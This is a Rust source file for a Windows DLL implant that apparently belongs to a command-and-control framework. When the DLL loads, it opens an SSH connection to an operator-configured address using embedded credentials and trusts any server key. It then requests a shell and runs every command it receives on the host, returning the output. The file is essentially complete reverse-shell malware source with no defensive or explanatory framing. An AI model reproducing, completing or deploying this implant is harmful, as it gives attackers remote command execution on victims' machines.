#![no_main]
#![allow(dead_code)]

use std::io;
use std::io::Write;
use std::os::raw::c_void;
use std::process::{exit, Command};
use std::sync::Arc;
use debug_print::debug_println;
use russh::*;
use russh::keys::*;
use scepter_common::{PASSWORD, SSH_CONNECT_IPV4_ADDRESS, SSH_PORT, USERNAME};

#[cfg(target_os = "windows")]
use windows_sys::Win32::Foundation::{BOOL, HANDLE};

struct Client {}
impl client::Handler for Client {
    type Error = russh::Error;
    async fn check_server_key(
        &mut self,
        _server_public_key: &ssh_key::PublicKey,
    ) -> Result<bool, Self::Error> {
        Ok(true)
    }
}

pub struct Session {
    session: client::Handle<Client>,
}

impl Session {
    async fn call(&mut self, command: &str) -> tokio::io::Result<u32>{
        let mut channel = self.session.channel_open_session().await.unwrap();
        channel.exec(true, command).await.unwrap();

        let mut code = None;
        let mut stdout = std::io::stdout();

        loop {
            // There's an event available on the session channel
            let Some(msg) = channel.wait().await else {
                break;
            };
            match msg {
                // Write data to the terminal
                ChannelMsg::Data { ref data } => {
                    stdout.write_all(data).unwrap();
                    stdout.flush().unwrap();
                }
                // The command has returned an exit code
                ChannelMsg::ExitStatus { exit_status } => {
                    code = Some(exit_status);
                    // cannot leave the loop immediately, there might still be more data to receive
                }
                _ => {}
            }
        }
        Ok(code.expect("program did not exit cleanly"))
    }
}

pub fn execute_command(command: &str) -> Result<String, io::Error> {
    // Handle the exit command specially
    if command.starts_with("exit") {
        debug_println!("Exiting...");
        exit(0);
    }

    // For other commands, parse into program and arguments
    let parts: Vec<&str> = command.split_whitespace().collect();
    if parts.is_empty() {
        return Err(std::io::Error::new(io::ErrorKind::InvalidInput, "Empty command"));
    }

    let program = parts[0];
    let args = &parts[1..];

    // Create and execute the command, capturing output
    let output = Command::new(program)
        .args(args)
        .output()?;

    // Check if the command executed successfully
    if output.status.success() {
        // Convert the output to a string and return it
        let stdout = String::from_utf8_lossy(&output.stdout).to_string();
        Ok(stdout)
    } else {
        // If the command failed, return the error message
        let stderr = String::from_utf8_lossy(&output.stderr).to_string();
        Err(std::io::Error::new(
            io::ErrorKind::Other,
            format!("Command failed: {}", stderr)
        ))
    }
}


pub async fn dll_main() {
    let config = russh::client::Config::default();
    let config = Arc::new(config);
    let sh = Client {};

    let interface_ip = String::from_utf8_lossy(SSH_CONNECT_IPV4_ADDRESS).to_string().trim_matches(char::from(0)).to_string();
    let ssh_port = String::from_utf8_lossy(SSH_PORT).to_string().trim_matches(char::from(0)).to_string();
    let addrs = format!("{}:{}", interface_ip, ssh_port);

    debug_println!("Connecting to {}", addrs);

    match client::connect(config, addrs, sh).await {
        Ok(mut session) => {
            let username = String::from_utf8_lossy(USERNAME).to_string().trim_matches(char::from(0)).to_string();
            let password = String::from_utf8_lossy(PASSWORD).to_string().trim_matches(char::from(0)).to_string();

            debug_println!("Authenticating with username {} and password {}", username, password);

            // Authenticate with password
            let auth_result = session.authenticate_password(username, password).await;

            match auth_result {
                Ok(auth) => {
                    if auth.success() {
                        debug_println!("Authentication successful");

                        // After successful authentication, open a session channel using the session handle
                        match session.channel_open_session().await {
                            Ok(mut channel) => {
                                debug_println!("Session channel opened");

                                // Request a shell - this is crucial for receiving ongoing data
                                match channel.request_shell(true).await {
                                    Ok(_) => {
                                        debug_println!("Shell session established, waiting for messages...");

                                        // Wait for messages from the server
                                        loop {
                                            match channel.wait().await {
                                                Some(ChannelMsg::Data { ref data }) => {
                                                    let input = String::from_utf8_lossy(data);
                                                    debug_println!("Server message: {}", String::from_utf8_lossy(data));
                                                    let _ = match execute_command(&*input){
                                                        Ok(output) => {
                                                            debug_println!("{}", output);
                                                            // Use the data method provided by the russh library:
                                                            session.data(channel.id(), CryptoVec::from(output.as_bytes())).await.unwrap();
                                                        },
                                                        Err(e) => {
                                                            debug_println!("Error: {}", e);
                                                            // Use the data method provided by the russh library:
                                                            session.data(channel.id(), CryptoVec::from(e.to_string().as_bytes())).await.unwrap();
                                                        }
                                                    };

                                                },
                                                Some(ChannelMsg::ExtendedData { ref data, .. }) => {
                                                    debug_println!("Server extended data: {}", String::from_utf8_lossy(data));
                                                },
                                                Some(ChannelMsg::Eof) => {
                                                    debug_println!("Server closed the connection (EOF)");
                                                    break;
                                                },
                                                Some(ChannelMsg::ExitStatus { exit_status }) => {
                                                    debug_println!("Server session exited with status: {}", exit_status);
                                                    break;
                                                },
                                                Some(other) => {
                                                    debug_println!("Other message from server: {:?}", other);
                                                },
                                                None => {
                                                    debug_println!("Channel closed unexpectedly");
                                                    break;
                                                }
                                            }
                                        }
                                    },
                                    Err(e) => {
                                        debug_println!("Failed to request shell: {}", e);
                                    }
                                }
                            },
                            Err(e) => {
                                debug_println!("Failed to open session channel: {}", e);
                            }
                        }
                    } else {
                        debug_println!("Authentication failed");
                    }
                },
                Err(e) => {
                    debug_println!("Authentication error: {}", e);
                }
            }
        },
        Err(e) => {
            debug_println!("Connection error: {}", e);
        }
    }

    debug_println!("Connection closed");
}


#[cfg(target_os = "windows")]
#[unsafe(no_mangle)]
#[allow(non_snake_case, unused_variables, unreachable_patterns)]
pub unsafe extern "system" fn DllMain(
    dll_module: HANDLE,
    call_reason: u32,
    reserved: *mut c_void,
) -> BOOL {
    match call_reason {
        DLL_PROCESS_ATTACH => {
            // Code to run when the DLL is loaded into a process
            // Initialize resources, etc.
            let _ = dll_main();
        }
        DLL_THREAD_ATTACH => {
            // Code to run when a new thread is created in the process
        }
        DLL_THREAD_DETACH => {
            // Code to run when a thread exits cleanly
        }
        DLL_PROCESS_DETACH => {
            // Code to run when the DLL is unloaded from the process
            // Clean up resources, etc.
        }
        _ => {}
    }
    return 1;
}
